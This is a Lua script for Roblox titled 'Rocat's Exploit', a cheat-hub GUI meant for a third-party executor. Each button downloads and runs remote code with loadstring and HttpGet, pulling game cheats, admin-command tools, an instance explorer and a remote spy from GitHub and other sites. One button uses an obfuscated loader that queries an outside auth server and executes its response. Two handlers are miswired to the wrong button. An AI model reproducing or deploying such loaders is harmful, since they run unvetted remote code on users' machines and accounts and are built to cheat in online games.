-- Rocat's Exploit

-- By: SG#6284
-- Version: V

-- Instances:

local RocatHub = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Frame1 = Instance.new("Frame")
local NameGUI = Instance.new("TextLabel")
local Icon = Instance.new("ImageLabel")
local X = Instance.new("TextButton")
local PetSimX = Instance.new("ImageButton")
local MM2 = Instance.new("ImageButton")
local DesSim = Instance.new("ImageButton")
local FNF = Instance.new("ImageButton")
local BeeSwarm = Instance.new("ImageButton")
local BloxFruit2 = Instance.new("ImageButton")
local BAPM = Instance.new("ImageButton")
local Adopt = Instance.new("ImageButton")
local SlapBattles = Instance.new("ImageButton")
local NinjaL = Instance.new("ImageButton")
local MyRes = Instance.new("ImageButton")
local BloxFruit1 = Instance.new("ImageButton")
local Frame2 = Instance.new("Frame")
local InfYield = Instance.new("TextButton")
local CMDx = Instance.new("TextButton")
local DarkDex = Instance.new("TextButton")
local RemoteSpy = Instance.new("TextButton")
local OpenButton = Instance.new("TextButton")

--Properties:

RocatHub.Name = "RocatHub"
RocatHub.Parent = game.CoreGui
RocatHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = RocatHub
Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.302527666, 0, 0.180467084, 0)
Main.Size = UDim2.new(0.394944698, 0, 0.636942685, 0)
Main.Visible = false
Main.Active = true
Main.Draggable = true

Frame1.Name = "Frame1"
Frame1.Parent = Main
Frame1.BackgroundColor3 = Color3.fromRGB(99, 99, 99)
Frame1.BorderSizePixel = 0
Frame1.Position = UDim2.new(0, 0, -0.00286626187, 0)
Frame1.Size = UDim2.new(1, 0, 0.150000006, 0)

NameGUI.Name = "NameGUI"
NameGUI.Parent = Frame1
NameGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameGUI.BackgroundTransparency = 1.000
NameGUI.BorderSizePixel = 0
NameGUI.Position = UDim2.new(0.111999996, 0, -0.00286627887, 0)
NameGUI.Size = UDim2.new(0.486000001, 0, 1.00286639, 0)
NameGUI.Font = Enum.Font.SourceSans
NameGUI.Text = "Rocat's Exploit"
NameGUI.TextColor3 = Color3.fromRGB(240, 240, 240)
NameGUI.TextScaled = true
NameGUI.TextSize = 14.000
NameGUI.TextWrapped = true

Icon.Name = "Icon"
Icon.Parent = Frame1
Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icon.BackgroundTransparency = 1.000
Icon.Position = UDim2.new(0, 0, -0.0222222228, 0)
Icon.Size = UDim2.new(0.0920000002, 0, 1.02222228, 0)
Icon.Image = "rbxassetid://9316377281"

X.Name = "X"
X.Parent = Main
X.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
X.BorderColor3 = Color3.fromRGB(53, 53, 53)
X.BorderSizePixel = 2
X.Position = UDim2.new(0.906000018, 0, 0.0133333504, 0)
X.Size = UDim2.new(0.0700000003, 0, 0.116666667, 0)
X.Font = Enum.Font.SourceSans
X.Text = "X"
X.TextColor3 = Color3.fromRGB(255, 0, 4)
X.TextScaled = true
X.TextSize = 14.000
X.TextWrapped = true

PetSimX.Name = "PetSimX"
PetSimX.Parent = Main
PetSimX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PetSimX.BorderColor3 = Color3.fromRGB(70, 70, 70)
PetSimX.BorderSizePixel = 2
PetSimX.Position = UDim2.new(0.027999999, 0, 0.170000002, 0)
PetSimX.Size = UDim2.new(0, 75, 0, 75)
PetSimX.Image = "rbxassetid://9316408635"
PetSimX.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
end)

MM2.Name = "MM2"
MM2.Parent = Main
MM2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MM2.BorderColor3 = Color3.fromRGB(70, 70, 70)
MM2.BorderSizePixel = 2
MM2.Position = UDim2.new(0.203999996, 0, 0.170000002, 0) 
MM2.Size = UDim2.new(0, 75, 0, 75)
MM2.Image = "rbxassetid://9316676593"
MM2.MouseButton1Down:Connect(function()
	loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

DesSim.Name = "DesSim"
DesSim.Parent = Main
DesSim.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DesSim.BorderColor3 = Color3.fromRGB(70, 70, 70)
DesSim.BorderSizePixel = 2
DesSim.Position = UDim2.new(0.0279999971, 0, 0.439999998, 0)
DesSim.Size = UDim2.new(0, 75, 0, 75)
DesSim.Image = "rbxassetid://9316682835"
DesSim.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FadeRemix/RND-Games/main/DestructionSim.lua"))()
end)

FNF.Name = "FNF"
FNF.Parent = Main
FNF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FNF.BorderColor3 = Color3.fromRGB(70, 70, 70)
FNF.BorderSizePixel = 2
FNF.Position = UDim2.new(0.560000002, 0, 0.170000002, 0)
FNF.Size = UDim2.new(0, 75, 0, 75)
FNF.Image = "rbxassetid://9316678249"
FNF.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
end)

BeeSwarm.Name = "BeeSwarm"
BeeSwarm.Parent = Main
BeeSwarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BeeSwarm.BorderColor3 = Color3.fromRGB(70, 70, 70)
BeeSwarm.BorderSizePixel = 2
BeeSwarm.Position = UDim2.new(0.379999995, 0, 0.170000002, 0)
BeeSwarm.Size = UDim2.new(0, 75, 0, 75)
BeeSwarm.Image = "rbxassetid://9316685224"
BeeSwarm.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/kocmoc-remastered.lua"))()
end)

BloxFruit2.Name = "BloxFruit2"
BloxFruit2.Parent = Main
BloxFruit2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BloxFruit2.BorderColor3 = Color3.fromRGB(70, 70, 70)
BloxFruit2.BorderSizePixel = 2
BloxFruit2.Position = UDim2.new(0.560000002, 0, 0.716666639, 0)
BloxFruit2.Size = UDim2.new(0, 75, 0, 75)
BloxFruit2.Image = "rbxassetid://9316699604"
BloxFruit2.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
end)

BAPM.Name = "BAPM"
BAPM.Parent = Main
BAPM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BAPM.BorderColor3 = Color3.fromRGB(70, 70, 70)
BAPM.BorderSizePixel = 2
BAPM.Position = UDim2.new(0.560000002, 0, 0.439999968, 0)
BAPM.Size = UDim2.new(0, 75, 0, 75)
BAPM.Image = "rbxassetid://9316696982"
BAPM.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
end)

Adopt.Name = "Adopt"
Adopt.Parent = Main
Adopt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Adopt.BorderColor3 = Color3.fromRGB(70, 70, 70)
Adopt.BorderSizePixel = 2
Adopt.Position = UDim2.new(0.379999995, 0, 0.716666639, 0)
Adopt.Size = UDim2.new(0, 75, 0, 75)
Adopt.Image = "rbxassetid://9316718834"
Adopt.MouseButton1Down:Connect(function()
	getgenv().mainKey = "nil"

	local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)

SlapBattles.Name = "SlapBattles"
SlapBattles.Parent = Main
SlapBattles.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SlapBattles.BorderColor3 = Color3.fromRGB(70, 70, 70)
SlapBattles.BorderSizePixel = 2
SlapBattles.Position = UDim2.new(0.379999995, 0, 0.439999968, 0)
SlapBattles.Size = UDim2.new(0, 75, 0, 75)
SlapBattles.Image = "rbxassetid://9316694422"
SlapBattles.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)

NinjaL.Name = "NinjaL"
NinjaL.Parent = Main
NinjaL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NinjaL.BorderColor3 = Color3.fromRGB(70, 70, 70)
NinjaL.BorderSizePixel = 2
NinjaL.Position = UDim2.new(0.203999996, 0, 0.716666639, 0)
NinjaL.Size = UDim2.new(0, 75, 0, 75)
NinjaL.Image = "rbxassetid://9316701748"MM2.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://system-exodus.com/scripts/ninjalegends/NinjaLegendsV3.lua',true))()
end)


MyRes.Name = "MyRes"
MyRes.Parent = Main
MyRes.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MyRes.BorderColor3 = Color3.fromRGB(70, 70, 70)
MyRes.BorderSizePixel = 2
MyRes.Position = UDim2.new(0.203999996, 0, 0.439999968, 0)
MyRes.Size = UDim2.new(0, 75, 0, 75)
MyRes.Image = "rbxassetid://9316691174"
MyRes.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("http://void-scripts.com/Scripts/myRest.lua"))()
end)

BloxFruit1.Name = "BloxFruit1"
BloxFruit1.Parent = Main
BloxFruit1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BloxFruit1.BorderColor3 = Color3.fromRGB(70, 70, 70)
BloxFruit1.BorderSizePixel = 2
BloxFruit1.Position = UDim2.new(0.0279999971, 0, 0.716666639, 0)
BloxFruit1.Size = UDim2.new(0, 75, 0, 75)
BloxFruit1.Image = "rbxassetid://9316699604"MM2.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
end)

Frame2.Name = "Frame2"
Frame2.Parent = Main
Frame2.BackgroundColor3 = Color3.fromRGB(109, 109, 109)
Frame2.BorderColor3 = Color3.fromRGB(81, 81, 81)
Frame2.BorderSizePixel = 0
Frame2.Position = UDim2.new(0.737999976, 0, 0.166666672, 0)
Frame2.Size = UDim2.new(0.238000005, 0, 0.796666682, 0)

InfYield.Name = "InfYield"
InfYield.Parent = Frame2
InfYield.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
InfYield.BorderSizePixel = 0
InfYield.Position = UDim2.new(0.0583333336, 0, 0.0376569033, 0)
InfYield.Size = UDim2.new(0.875, 0, 0.209205016, 0)
InfYield.Font = Enum.Font.SourceSans
InfYield.Text = "InfYield"
InfYield.TextColor3 = Color3.fromRGB(0, 0, 0)
InfYield.TextScaled = true
InfYield.TextSize = 14.000
InfYield.TextWrapped = true
InfYield.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

CMDx.Name = "CMDx"
CMDx.Parent = Frame2
CMDx.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
CMDx.BorderSizePixel = 0
CMDx.Position = UDim2.new(0.0583333336, 0, 0.510460258, 0)
CMDx.Size = UDim2.new(0.875, 0, 0.209205016, 0)
CMDx.Font = Enum.Font.SourceSans
CMDx.Text = "CMD - X"
CMDx.TextColor3 = Color3.fromRGB(0, 0, 0)
CMDx.TextScaled = true
CMDx.TextSize = 14.000
CMDx.TextWrapped = true
CMDx.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end)

DarkDex.Name = "DarkDex"
DarkDex.Parent = Frame2
DarkDex.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
DarkDex.BorderSizePixel = 0
DarkDex.Position = UDim2.new(0.0583333336, 0, 0.276150644, 0)
DarkDex.Size = UDim2.new(0.875, 0, 0.209205016, 0)
DarkDex.Font = Enum.Font.SourceSans
DarkDex.Text = "DarkDex"
DarkDex.TextColor3 = Color3.fromRGB(0, 0, 0)
DarkDex.TextScaled = true
DarkDex.TextSize = 14.000
DarkDex.TextWrapped = true
DarkDex.MouseButton1Down:Connect(function()
	loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
end)

RemoteSpy.Name = "RemoteSpy"
RemoteSpy.Parent = Frame2
RemoteSpy.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
RemoteSpy.BorderSizePixel = 0
RemoteSpy.Position = UDim2.new(0.0583333336, 0, 0.748953998, 0)
RemoteSpy.Size = UDim2.new(0.875, 0, 0.217573225, 0)
RemoteSpy.Font = Enum.Font.SourceSans
RemoteSpy.Text = "Remote Spy"
RemoteSpy.TextColor3 = Color3.fromRGB(0, 0, 0)
RemoteSpy.TextScaled = true
RemoteSpy.TextSize = 14.000
RemoteSpy.TextWrapped = true
RemoteSpy.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua",true))()
end)

OpenButton.Name = "OpenButton"
OpenButton.Parent = RocatHub
OpenButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenButton.Position = UDim2.new(0.1935229, 0, 0.925689995, 0)
OpenButton.Size = UDim2.new(0.0609583072, 0, 0.0727659315, 0)
OpenButton.Font = Enum.Font.SciFi
OpenButton.Text = "Open"
OpenButton.TextColor3 = Color3.fromRGB(0, 0, 0)
OpenButton.TextScaled = true
OpenButton.TextSize = 14.000
OpenButton.TextWrapped = true

-- Scripts:

local function WXZS_fake_script() -- X.LocalScript 
	local script = Instance.new('LocalScript', X)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(WXZS_fake_script)()
local function KZGB_fake_script() -- OpenButton.LocalScript 
	local script = Instance.new('LocalScript', OpenButton)

	local frame = script.Parent.Parent.Main
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		else
			frame.Visible = false
		end
	end)
end
coroutine.wrap(KZGB_fake_script)()
